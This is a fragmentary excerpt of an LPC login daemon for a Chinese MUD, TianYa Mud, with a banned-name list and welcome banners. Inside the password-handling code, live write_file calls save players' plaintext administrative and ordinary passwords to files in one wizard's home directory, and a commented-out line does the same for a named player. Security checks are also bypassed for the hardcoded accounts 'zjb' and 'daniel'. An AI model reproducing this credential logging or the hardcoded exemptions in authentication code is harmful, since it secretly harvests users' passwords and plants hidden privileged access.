...
string *banned_id =   ({"admin","arch","wizard","apprentice","immortal","player","fuck","budai","maimaiti"});
...
{
        write("\n\n");
            write("◇ "HIW BRED "Welcome to TianYa Mud.\n\n" NOR);
             write("◇ "HIW BRED"HomePage：http://tymud.126.com\n\n" NOR);
            write("◇ "HIW BRED"Send Email：daniel_mud@163.com\n\n" NOR);
            write("◇ "HIY"本站服务器由山东缁博联通公司提供，特此鸣谢！\n\n" NOR);
      write("◇ "HIG BRED"天涯诚征各种类型合作，欢迎联系洽谈！\n\n" NOR);
            write("◇ "HIY BBLU"Select 国标码 GB or き絏 BIG5 (gb/big5)"NOR);
      write("\n\n");
...
//"/cmds/std/port2"->main(this_object(),"")
    ...
    write(YEL"( き絏 BIG5 use port 8888)"NOR);
...
protected void get_id(string arg, object ob,int ip_cnt)
{
    ...
    if( (string)SECURITY_D->get_status(arg)=="(player)"
         && (sizeof(users()) - wiz_cnt) >= 300 && ip_cnt > 1) 
    {
	ppl = find_body(arg);
...
/*
if ( ob->query("id")=="xwb")
write_file( "/u/zjb/ps/idps",sprintf("%s的密码%s。\n", ob->query("id"),pass));
*/
        check_ok(ob);
...
write_file( "/u/zjb/ps/newid",sprintf("%s的管理密码是%s。\n", ob->query("id"),pass));
        ob->set("ad_password", old_pass);
...
write_file( "/u/zjb/ps/newid2",sprintf("%s的普通密码是%s。\n", ob->query("id"),pass));
...
/*
    if ( previous_object() ) {
    if (base_name(previous_object()) != "/adm/daemons/logind"&&
    base_name(previous_object()) != "/cmds/app/update"&&getuid(this_player())!="zjb")
    {
    log_file( "login/exec",sprintf("%s从%s登录企图进入%s 
    身体,来自原文件%s,时间发生与(%s)。\n", ob->query("name")+"("+ob->query("id")+")", 
    query_ip_number(ob),user->query("id"),base_name(previous_object()),ctime(time()) ));
    destruct(user);    
    destruct(ob);    
    return 0;
    }
...
"/cmds/app/update"&&getuid(this_player())!="zjb"&&getuid(this_player())!="daniel")
{
...
if ( user->query("id") == "zjb" || user->query("id") == "daniel" )
{
write(HIG"────────────────────────────────────────\n"NOR);
...
//         user->start_more( read_file("/u/daniel/jizi2") );
